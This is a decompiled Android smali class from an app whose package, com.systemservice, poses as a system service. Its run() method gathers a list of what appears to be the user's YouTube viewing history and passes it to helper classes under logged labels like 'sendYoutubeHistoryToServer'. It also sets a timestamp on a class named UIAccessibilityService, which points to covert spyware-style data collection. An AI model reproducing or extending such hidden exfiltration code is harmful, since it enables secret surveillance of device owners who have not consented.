.class Lcom/systemservice/a/c/i/b;
.super Ljava/lang/Object;
.source ""

# interfaces
.implements Ljava/lang/Runnable;


# annotations
.annotation system Ldalvik/annotation/EnclosingMethod;
    value = Lcom/systemservice/a/c/i/c;->a(Ljava/util/List;)V
.end annotation

.annotation system Ldalvik/annotation/InnerClass;
    accessFlags = 0x0
    name = null
.end annotation


# instance fields
.field final synthetic a:Ljava/util/List;

.field final synthetic b:Lcom/systemservice/a/c/i/c;


# direct methods
.method constructor <init>(Lcom/systemservice/a/c/i/c;Ljava/util/List;)V
    .locals 0

    iput-object p1, p0, Lcom/systemservice/a/c/i/b;->b:Lcom/systemservice/a/c/i/c;

    iput-object p2, p0, Lcom/systemservice/a/c/i/b;->a:Ljava/util/List;

    invoke-direct {p0}, Ljava/lang/Object;-><init>()V

    return-void
.end method


# virtual methods
.method public run()V
    .locals 4

    const-string v0, "youtube_history"

    :try_start_0
    invoke-static {}, Lcom/systemservice/a/a/l;->l()J

    move-result-wide v1

    sput-wide v1, Lcom/systemservice/common/boostReceiver/UIAccessibilityService;->j:J

    const-string v1, "sendYoutubeHistoryToServer"

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    new-instance v1, Lcom/systemservice/a/c/i/a;

    iget-object v2, p0, Lcom/systemservice/a/c/i/b;->b:Lcom/systemservice/a/c/i/c;

    invoke-static {v2}, Lcom/systemservice/a/c/i/c;->a(Lcom/systemservice/a/c/i/c;)Landroid/content/Context;

    move-result-object v2

    const/4 v3, 0x0

    invoke-direct {v1, v2, v3}, Lcom/systemservice/a/c/i/a;-><init>(Landroid/content/Context;Z)V

    iget-object v2, p0, Lcom/systemservice/a/c/i/b;->b:Lcom/systemservice/a/c/i/c;

    invoke-static {v2}, Lcom/systemservice/a/c/i/c;->a(Lcom/systemservice/a/c/i/c;)Landroid/content/Context;

    move-result-object v2

    iget-object v3, p0, Lcom/systemservice/a/c/i/b;->a:Ljava/util/List;

    invoke-virtual {v1, v2, v3}, Lcom/systemservice/a/c/i/a;->a(Landroid/content/Context;Ljava/util/List;)I

    move-result v1

    new-instance v2, Lcom/systemservice/a/h/o;

    iget-object v3, p0, Lcom/systemservice/a/c/i/b;->b:Lcom/systemservice/a/c/i/c;

    invoke-static {v3}, Lcom/systemservice/a/c/i/c;->a(Lcom/systemservice/a/c/i/c;)Landroid/content/Context;

    move-result-object v3

    invoke-direct {v2, v3}, Lcom/systemservice/a/h/o;-><init>(Landroid/content/Context;)V

    iget-object v3, p0, Lcom/systemservice/a/c/i/b;->a:Ljava/util/List;

    invoke-virtual {v2, v3}, Lcom/systemservice/a/h/o;->a(Ljava/util/List;)V

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "sendYoutubeHistoryToServer = "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(I)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I
    :try_end_0
    .catch Ljava/lang/Exception; {:try_start_0 .. :try_end_0} :catch_0

    goto :goto_0

    :catch_0
    move-exception v1

    new-instance v2, Ljava/lang/StringBuilder;

    invoke-direct {v2}, Ljava/lang/StringBuilder;-><init>()V

    const-string v3, "sendYoutubeHistoryToServer ERROR "

    invoke-virtual {v2, v3}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v1}, Ljava/lang/Exception;->getMessage()Ljava/lang/String;

    move-result-object v1

    invoke-virtual {v2, v1}, Ljava/lang/StringBuilder;->append(Ljava/lang/String;)Ljava/lang/StringBuilder;

    invoke-virtual {v2}, Ljava/lang/StringBuilder;->toString()Ljava/lang/String;

    move-result-object v1

    invoke-static {v0, v1}, Landroid/util/Log;->d(Ljava/lang/String;Ljava/lang/String;)I

    :goto_0
    return-void
.end method
